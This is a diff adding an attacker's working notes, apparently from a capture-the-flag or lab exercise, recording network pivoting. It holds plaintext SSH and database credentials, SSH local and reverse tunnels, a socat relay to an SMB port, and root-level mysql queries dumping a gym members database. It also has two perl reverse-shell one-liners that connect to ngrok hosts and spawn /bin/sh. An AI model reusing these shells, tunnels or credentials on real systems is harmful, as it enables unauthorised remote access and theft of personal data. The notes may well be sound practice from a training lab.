@@ -1,0 +1,61 @@
+Notes
+
+Level 11 -> cat md5find  | egrep  "^[a-f0-9]{32}$"
+	* Finds and MD5 hash based on the properties of an MD5 hash style
+	* Tried in python but couldnt get the regexp right for that
+	
+
+
+10.218.176.199 with user: whistler and password: cocktailparty
+ssh -p 2222 tunneler@159.203.81.45 -L 2222:10.218.176.199:22   - pass = tunneler
+
+Reverse tunnel - suck up traffic on another network 
+ssh -p 2222 whistler@127.0.0.1 -R 58673:localhost:55555
+reverse -> <REMOTE_PORT>:<NEW_HOST>:<NEW_PORT>
+
+
+10.112.3.12 ssh port: 22 user: crease pass: NoThatsaV
+
+
+
+socat TCP4-LISTEN:7777,reuseaddr,fork TCP:10.24.13.10:445
+
+
+mysql -u root -ptoor -h 10.213.12.10 -e 'show databases'
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'show tables'
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'describe Tables_in_gym'
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'describe locations'
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'describe login_attempts'
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select * from login_attempts ORDER BY time DESC'
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select gymlocation from members'
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select id,location from locations'
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'describe members'
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select currentmembership from members'
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select COUNT(username) from members WHERE currentmembership = 1 AND gymlocation = 0' --1004
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select COUNT(username) from members WHERE currentmembership = 1 AND gymlocation = 1' --1050
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select COUNT(username) from members WHERE currentmembership = 1 AND gymlocation = 2' --975
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select COUNT(username) from members WHERE currentmembership = 1 AND gymlocation = 3' --1033
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select COUNT(username) from members WHERE currentmembership = 1 AND gymlocation = 4' --954
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select COUNT(username) from members WHERE gymlocation = 0' --2018
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select COUNT(username) from members WHERE gymlocation = 1' --2017
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select COUNT(username) from members WHERE gymlocation = 2' --1971
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select COUNT(username) from members WHERE gymlocation = 3' --2068
+mysql -D gym -u root -ptoor -h 10.213.12.10 -e 'select COUNT(username) from members WHERE gymlocation = 4' --1926
+
+
+Linux 65d793ff7857 4.15.0-66-generic #75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 x86_64 GNU/Linux
+
+
+perl -e 'use Socket;$i="0.tcp.ngrok.io";$p=19266;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+2.tcp.ngrok.io:11960
+
+Needed a webshell first
+perl -e 'use Socket;$i="2.tcp.ngrok.io";$p=11960;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+$db_username="admin";
+$db_password="7LIH3GOm6C5h";
+$db_host="localhost";
+$db_name="beanies";
+
